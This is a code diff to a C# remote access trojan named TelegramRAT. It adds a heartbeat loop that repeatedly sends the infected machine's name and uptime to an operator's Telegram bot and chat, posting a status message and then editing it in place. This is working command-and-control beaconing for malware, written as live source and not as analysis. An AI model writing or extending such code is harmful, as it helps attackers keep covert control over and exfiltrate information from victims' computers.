@@ -28,7 +28,61 @@ namespace TelegramRAT
         public static Thread waitCommandsThread = new Thread(waitCommands);
         // Thread is blocked
         public static bool waitThreadIsBlocked = false;
-     
+
+        // ====== HEARTBEAT SYSTEM ======
+
+        private static string heartbeatMessageID = null; // Telegram message ID for editing
+        private static DateTime startTime = DateTime.Now;
+        private static DateTime lastHeartbeatTime = DateTime.Now;
+
+        public static void HeartbeatLoop()
+        {
+            while (true)
+            {
+                SendOrUpdateHeartbeat();
+                Thread.Sleep(config.heartbeatInterval * 1000);
+            }
+        }
+
+        public static void SendOrUpdateHeartbeat()
+        {
+            waitForUnblock();
+
+            DateTime now = DateTime.Now;
+            TimeSpan uptime = now - startTime;
+            string status = ((DateTime.Now - lastHeartbeatTime).TotalSeconds > config.offlineThreshold)
+                ? "OFFLINE"
+                : "ONLINE";
+
+            string messageText = $"🟢 STATUS: {status}\n" +
+                                 $"🖥 Device: {Environment.MachineName}\n" +
+                                 $"⏱ Uptime: {uptime:hh\\:mm\\:ss}\n" +
+                                 $"🕒 Last heartbeat: {now:HH:mm:ss}\n" +
+                                 $"⚠ No updates > {config.offlineThreshold} sec = OFFLINE\n" +
+                                 $"📌 TIP: Pin this message.";
+
+            using (WebClient client = new WebClient())
+            {
+                if (heartbeatMessageID == null)
+                {
+                    // Send new message and store its ID
+                    string response = client.DownloadString(
+                        $"https://api.telegram.org/bot{config.TelegramToken}/sendMessage?chat_id={config.TelegramChatID}&text={Uri.EscapeDataString(messageText)}"
+                    );
+                    var json = JSON.Parse(response);
+                    heartbeatMessageID = json["result"]["message_id"].Value;
+                }
+                else
+                {
+                    // Edit existing heartbeat message
+                    client.DownloadString(
+                        $"https://api.telegram.org/bot{config.TelegramToken}/editMessageText?chat_id={config.TelegramChatID}&message_id={heartbeatMessageID}&text={Uri.EscapeDataString(messageText)}"
+                    );
+                }
+            }
+
+            lastHeartbeatTime = now;
+        }
 
         // If is blocked - wait
         private static void waitForUnblock()
